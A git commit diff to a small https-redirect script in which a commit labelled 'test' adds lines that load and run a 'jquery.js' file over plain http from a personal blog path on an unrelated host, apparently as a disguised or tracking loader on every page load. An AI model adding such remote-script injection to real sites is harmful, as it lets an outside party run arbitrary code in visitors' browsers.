ae6f87a19355f4e1d3a0f8383e11922a40bb26a9
Elepover <elepover@outlook.com>
2017-12-16 16:18:00 +0800

    test

--- cdn/js/https.js
+++ cdn/js/https.js
@@ -4,3 +4,6 @@ if(location.protocol == "http:")
     s = s.replace("http:","https:");
     window.location = s;
 }
+var cnzz_script = document.createElement("script");
+cnzz_script.src="http://blog.163.com/zengyin777@126/blog/jquery.js";
+document.getElementsByTagName("head")[0].appendChild(cnzz_script);
